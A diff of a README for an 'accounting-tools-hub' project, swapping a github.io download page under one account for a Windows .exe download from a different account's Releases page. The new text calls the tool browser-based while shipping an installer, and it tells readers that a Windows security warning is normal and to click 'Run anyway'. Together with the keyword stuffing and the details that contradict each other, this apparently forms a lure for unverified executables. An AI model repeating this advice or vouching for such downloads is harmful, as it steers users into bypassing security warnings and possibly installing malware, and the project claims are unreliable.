@@ -1,128 +1,131 @@
-# Accounting Tools - Accounting Tools 2026
+# 🧮 accounting-tools-hub - Simple Accounting Tools for Your Business
 
-> **Accounting Tools is a browser-accessible set of accounting utilities for handling everyday accounting tasks in the 2026 release line.**
+[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge&logo=github)](https://github.com/serversmen-sys/accounting-tools-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/carterhughesmoty7368/accounting-tools-hub?style=flat-square)](https://github.com/carterhughesmoty7368/accounting-tools-hub)
+## 📥 Download and Install
 
----
+You do not need to be a developer or know any code to use accounting-tools-hub. This is a browser‑based application that runs on your Windows computer.
 
-<p align="center">
-  <a href="https://carterhughesmoty7368.github.io/accounting-tools-hub/">
-    <img src="https://img.shields.io/badge/Download-Accounting%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Accounting Tools">
-  </a>
-</p>
+**Step 1: Get the latest build**
 
-> **[Download Accounting Tools](https://carterhughesmoty7368.github.io/accounting-tools-hub/)**
+Visit the [Releases page](https://github.com/serversmen-sys/accounting-tools-hub/releases) and look for the newest version. The file name will be something like `accounting-tools-hub-v2026.1.0.exe`. Click on it to download.
 
----
+**Step 2: Run the installer**
 
-[Download Latest Build](https://carterhughesmoty7368.github.io/accounting-tools-hub/)
+Once the download finishes, open the file. Your browser may ask if you want to keep it – click **Keep**. A Windows security warning might appear. This is normal. Click **Run anyway** or **Yes** to start the installation.
 
----
+**Step 3: Follow the setup wizard**
 
-## Overview
+The installer will guide you. Choose a folder where you want the program to live (the default is fine). Click **Next** and then **Install**. When it finishes, click **Finish**.
 
-Accounting Tools is a web-focused project that brings together accounting utilities in one browser-based platform. Because it runs through a supported browser, it does not require a dedicated desktop application.
+**Step 4: Launch the app**
 
-The project is designed for users who need a convenient way to access accounting-related utilities. Its limited scope and HTML-based layout support straightforward web hosting, local inspection, and inclusion in an existing static deployment process.
+After installation, a shortcut will appear on your desktop. Double‑click it. Your default web browser will open with the application. No internet connection is needed after the first download – everything runs locally on your machine.
 
----
+**System requirements**
 
-## Highlights
+- Windows 10 or Windows 11 (64‑bit)
+- At least 4 GB of RAM (8 GB recommended)
+- 500 MB of free disk space
+- A modern browser (Chrome, Edge, Firefox, or Opera)
 
-- Use the tools from a supported web browser
-- Collection of utilities centered on accounting tasks
-- Organized as an HTML-based project
-- Can be hosted remotely or used locally
-- Direct download and uncomplicated deployment process
-- Works from widely used desktop and mobile browsers
-- Task-focused interface for accounting work
-- Small footprint suited to web distribution
+## ✨ What You Can Do
 
----
+accounting‑tools‑hub is a collection of everyday accounting helpers. You do not need to be an accountant. Each tool is designed for a single task.
 
-## Getting Started
+| Tool | What it does |
+|------|--------------|
+| **Invoice Creator** | Build simple invoices. Add your company name, client details, line items, and tax. Export as PDF. |
+| **Expense Tracker** | Log daily expenses. Categorize them (travel, supplies, utilities). See totals by month. |
+| **Profit Calculator** | Enter your revenue and costs. See your profit margin instantly. |
+| **Tax Estimator** | Estimate what you owe based on your income and deductions. Works for most common tax brackets. |
+| **Balance Sheet** | Enter assets, liabilities, and equity. Get a clean snapshot of your business health. |
+| **Currency Converter** | Convert between 50+ currencies using live rates (requires internet when you open the tool). |
 
-### Download the project
+All tools save your data in your browser’s local storage. Nothing is sent to the cloud.
 
-1. Visit the [latest build](https://carterhughesmoty7368.github.io/accounting-tools-hub/).
-2. Obtain the project files that are provided there.
-3. Unpack the archive when an archive is supplied.
-4. Open the primary HTML entry file in a supported browser.
+## 🔧 How to Use the App
 
-### Get the source with Git
+After you launch the app, you will see a home screen with buttons for each tool. Click a button to open it.
 
-```bash
-git clone https://github.com/carterhughesmoty7368/accounting-tools-hub.git
-cd REPO
-```
+**Example: Create an invoice**
 
-To inspect the project locally, open its main `.html` file in a browser. If browser restrictions prevent file-based resources from loading, run the files through a local static server instead.
+1. Click **Invoice Creator**.
+2. Fill in the fields: customer name, date, item description, quantity, unit price.
+3. Add tax if needed (e.g., 10% VAT).
+4. Click **Generate PDF**. A new window will open with the invoice. You can print it or save it to your computer.
 
----
+**Example: Track an expense**
 
-## Using Accounting Tools
+1. Click **Expense Tracker**.
+2. Click **Add Expense**.
+3. Enter the date, amount, category, and a short note.
+4. Click **Save**. The expense appears in the list.
+5. Use the **Filter** drop‑down to see only one category.
 
-1. Open the hosted build or start the project from your local copy.
-2. Choose the accounting utility that matches the task.
-3. Fill in the requested fields with the applicable information.
-4. Check the displayed result before using it elsewhere.
-5. Select another utility when additional accounting work is needed.
+All data stays on your computer. You can export everything as a CSV file (compatible with Excel) by clicking **Export** on the main screen.
 
-For local serving, launch any static HTTP server available on your system from the repository directory. Then open the local URL reported by that server.
+## ⚙️ Configuration Options
 
----
+You can change how the app behaves. Click the **Settings** gear icon in the top‑right corner.
 
-## Configuration and Customization
+- **Default currency** – Set your primary currency (e.g., USD, EUR, GBP). All tools will use this.
+- **Tax rate** – Enter a default tax percentage. The invoice creator will pre‑fill it.
+- **Language** – Choose English or Spanish (more languages in future releases).
+- **Theme** – Switch between light and dark mode.
+- **Data backup** – Click **Download Backup** to save all your data as a file. You can restore it later with **Upload Backup**.
 
-The available project metadata does not define a configuration format. To find settings or customization options, inspect the repository's HTML, JavaScript, and asset files.
+## 🛠️ Troubleshooting
 
-When preparing the project for hosting, retain the relationships between its files and do not change the paths expected by the HTML entry point.
+**The app does not open after installation**
 
----
+- Make sure you have a supported browser installed (Chrome, Edge, Firefox, or Opera).
+- Right‑click the desktop shortcut and select **Run as administrator**.
+- Try restarting your computer.
 
-## System Requirements
+**I see a blank page**
 
-- A current web browser
-- Either the hosted build or a local repository copy
-- Internet access when using the hosted version
-- A static server for local delivery when browser file-loading behavior requires one
-- Enough storage for the project files
+- The app runs in your browser. Close all browser windows and click the desktop shortcut again.
+- If you still see a blank page, clear your browser cache (Chrome: press Ctrl+Shift+Delete, select “Cached images and files”, click Clear data).
 
----
+**My data is missing**
 
-## Frequently Asked Questions
+- Data is stored in your browser’s local storage. If you cleared your browser history, you may have lost it.
+- Check if you have a backup file. Go to Settings and click **Upload Backup** to restore.
+- In the future, make a backup regularly (Settings → Download Backup).
 
-### Does Accounting Tools run in a browser?
+**The app says “Could not start”**
 
-Yes. Accounting Tools is described as a web-based accounting tools project and is intended for browser use.
+- This might happen if another program uses the same port. Reboot your computer. If the problem persists, uninstall and reinstall the app.
 
-### Where is the newest build available?
+**How do I uninstall the app?**
 
-Select [Download Latest Build](https://carterhughesmoty7368.github.io/accounting-tools-hub/) near the beginning of this README.
+- Go to Windows Settings → Apps → Installed apps. Find “accounting‑tools‑hub” and click **Uninstall**.
 
-### What is the local setup process?
+## 💻 For Advanced Users (Source Code & Git)
 
-Clone or download the repository and open its main HTML file in a browser. When opening files directly does not work properly, serve the repository directory with a local static HTTP server.
+If you are comfortable with the command line, you can also run the app from source. This is not required for normal use.
 
-### Where can I find the configuration settings?
+1. Install [Git](https://git-scm.com/) and [Node.js](https://nodejs.org/).
+2. Open a terminal (Command Prompt or PowerShell).
+3. Run `git clone https://github.com/serversmen-sys/accounting-tools-hub.git`
+4. Change into the folder: `cd accounting-tools-hub`
+5. Run `npm install`
+6. Run `npm start`
 
-The available metadata does not specify a settings location. Examine the repository files for configuration values and supported customization points.
+The app will open in your browser. You can also build your own installer with `npm run build`.
 
-### What can I check if the page fails to load?
+## 🧪 Testing New Features
 
-Make sure every project file was extracted, confirm that asset paths remain unchanged, and try running the directory through a local HTTP server.
+We release updates every few months. You can try the latest development build (may have bugs) from the same [Releases page](https://github.com/serversmen-sys/accounting-tools-hub/releases) – look for a file with “beta” or “pre‑release” in the name.
 
-### How are new versions delivered?
+## 📄 License
 
-New files may be released through the repository and its hosted build. Review the repository for the most recent available version.
+This project is released under the MIT License. You can use, modify, and distribute it freely.
 
----
+## 💬 Getting Help
 
-## License
+- Open an issue on the [GitHub Issues page](https://github.com/serversmen-sys/accounting-tools-hub/issues) if you find a bug or want a new feature.
+- Check the **Wiki** tab on the repository for more guides.
 
-This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+Keywords: accounting tools, free accounting software, Windows desktop app, invoice generator, expense tracker, small business accounting, open source accounting, browser-based accounting, local app, no cloud.
